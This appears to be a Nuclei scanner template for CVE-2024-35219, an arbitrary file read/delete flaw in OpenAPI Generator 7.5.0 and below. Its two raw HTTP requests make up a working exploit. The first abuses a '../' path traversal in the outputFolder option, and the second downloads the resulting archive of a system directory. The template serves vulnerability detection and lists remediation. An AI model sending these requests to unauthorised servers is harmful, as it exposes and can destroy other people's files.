flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    json:
    - .code
    name: code
    part: body
    type: json
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - code
    - link
  raw:
  - "POST /api/gen/clients/csharp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"authorizationValue\": {\n    \"keyName\": \"string\",\n    \"type\":\
    \ \"string\",\n    \"value\": \"string\"\n  },\n \"openAPIUrl\": \"https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/modules/openapi-generator/src/test/resources/2_0/petstore.yaml\"\
    ,\n   \"options\": {\"outputFolder\":\"../../../../../../usr/share/pixmaps/\"\
    },\n  \"spec\": {}\n}\n"
- matchers:
  - part: body
    type: word
    words:
    - pixmaps/debian-logo.png
  raw:
  - 'GET /api/gen/download/{{code}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-35219
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-35219
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H
    cvss-score: 8.3
    cwe-id: CWE-22
    epss-percentile: 0.9713
    epss-score: 0.39262
  description: 'OpenAPI Generator versions 7.5.0 and below are prone to an Arbitrary
    File Read/Delete vulnerability. Attackers can exploit this vulnerability to read
    and delete files and folders from an arbitrary, writable directory.

    '
  impact: 'Authenticated attackers can read and delete arbitrary files and folders
    from writable directories.

    '
  metadata:
    max-request: 2
    verified: true
  name: OpenAPI Generator <= 7.5.0 - Arbitrary File Read/Delete
  reference:
  - https://www.sonarsource.com/blog/the-power-of-taint-analysis-uncovering-critical-code-vulnerability-in-openapi-generator/
  - https://github.com/OpenAPITools/openapi-generator/commit/edbb021aadae47dcfe690313ce5119faf77f800d
  - https://github.com/OpenAPITools/openapi-generator/pull/18652
  - https://github.com/OpenAPITools/openapi-generator/security/advisories/GHSA-g3hr-p86p-593h
  - https://nvd.nist.gov/vuln/detail/CVE-2024-35219
  remediation: 'Update OpenAPI Generator to a version later than 7.5.0.

    '
  severity: high
  tags: cve,cve2024,openapi,intrusive,lfi,vkev,vuln
